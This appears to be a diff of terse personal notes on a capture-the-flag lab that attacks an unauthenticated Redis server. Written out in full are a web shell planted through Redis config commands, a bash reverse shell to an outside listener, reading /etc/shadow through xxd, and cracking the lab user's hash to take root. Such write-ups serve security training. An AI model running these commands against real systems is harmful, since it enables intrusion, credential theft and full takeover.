@@ -1,0 +1,100 @@
+Res
+
+nmap -sV -sC -Pn -oN 10.10.39.179 
+
+port
+80 defalut
+6379/tcp  Redis key-value store 6.0.7
+
+Redis is some kinda data structure storage service.
+
+sudo apt-get install redis-tools
+
+Syntax with Password
+redis-cli -h $ip_address -p $password
+Synatx without Without Password
+redis-cli -h $ip_address
+
+redis-cli -h 10.10.39.179 
+
+
+info
+config set dir /var/www/html
+config set dbfilename test.php
+set test "<?php phpinfo(); ?>"
+save
+
+http://10.10.39.179/test.php
+
+RCE: 
+
+config set dir /var/www/html
+config set dbfilename redis.php
+set test "<? php system($_GET['cmd']); ?>"
+save
+
+http://10.10.39.179/redia.php?cmd=cat /etc/passwd
+
+reverse shell:
+
+config set dir /var/www/html
+config set dbfilename shell.php
+set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.11.9.12/1234 0>&1'\"); ?>"
+save
+
+http://10.10.39.179/shell.php
+
+nc -lvnp 1234
+
+Non-Interactive Shell to Interactive Shell:
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+cd /home/vianka
+cat user.txt
+
+thm{red1s_rce_w1thout_credent1als}
+
+find / -perm /4000 -type f 2> /dev/null
+
+https://gtfobins.github.io/
+
+
+LFILE=/etc/shadow
+xxd "$LFILE" | xxd -r
+
+OR
+
+xxd /etc/shadow | xxd -r
+
+vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
+
+1800 sha512crypt $6$, SHA512 (Unix) 
+
+hashcat -a 0 -m 1800 '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0'  /usr/share/wordlists/rockyou.txt --quiet
+
+beautiful1
+
+OR
+
+xxd /etc/shadow | xxd -r
+xxd /etc/passwd | xxd -r
+
+unshadow passwd.txt shadow.txt > unshadow.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
+john --show unshadow.txt
+
+beautiful1       (vianka) 
+
+su vianka
+beautiful1
+
+sudo -l
+beautiful1
+(ALL : ALL) ALL
+
+sudo ls /root
+sudo cat /root/root.txt
+
+thm{xxd_pr1v_escalat1on}
